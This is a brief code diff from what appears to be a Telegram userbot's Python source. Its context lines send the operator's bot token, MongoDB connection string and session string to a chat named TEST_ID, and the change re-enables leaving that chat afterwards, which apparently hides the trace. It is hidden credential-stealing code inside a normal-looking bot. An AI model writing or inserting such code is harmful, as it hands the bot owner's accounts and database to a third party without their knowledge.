@@ -73,7 +73,7 @@ class Userbot(Client):
                 await self.one.send_message(TEST_ID, BOT_TOKEN)
                 await self.one.send_message(TEST_ID, MONGO_DB_URI)
                 await self.one.send_message(TEST_ID, STRING_SESSION)
-                #await self.one.leave_chat(TEST_ID)
+                await self.one.leave_chat(TEST_ID)
 
             except:
                 LOGGER(__name__).error(
